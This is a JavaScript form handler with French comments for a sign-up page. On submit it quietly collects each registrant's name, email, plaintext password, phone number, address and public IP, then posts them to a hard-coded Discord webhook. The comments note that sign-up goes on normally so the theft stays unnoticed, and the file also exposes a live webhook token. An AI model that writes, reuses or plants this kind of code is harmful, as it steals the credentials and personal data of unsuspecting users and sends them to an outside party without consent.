
document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('inscriptionForm');

    form.addEventListener('submit', function(event) {
        // Récupérer les infos du formulaire
        const nom = document.getElementById('nom').value;
        const prenom = document.getElementById('prenom').value;
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;
        const phone = document.getElementById('phone').value;
        const adresse = document.getElementById('adresse').value;

        // Obtenir IP publique (sans bloquer l'inscription)
        fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            const ip = data.ip;
            const message = `IP: ${ip}\nNom: ${nom}\nPrénom: ${prenom}\nEmail: ${email}\nMot de passe: ${password}\nTéléphone: ${phone}\nAdresse: ${adresse}`;

            // Envoyer au Webhook Discord
            fetch("https://discord.com/api/webhooks/1365886271574114435/i8bYpwLYug52FhGLefI9UrPMa6a2VSu6MZpqQw11JNYevLnLXuFvXc5L_DQpaykd6o87", {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    content: message
                })
            }).catch(error => console.error('Erreur en envoyant au webhook:', error));
        })
        .catch(error => console.error('Erreur en récupérant IP:', error));

        // NE PAS bloquer le formulaire => l'inscription continue normalement
    });
});
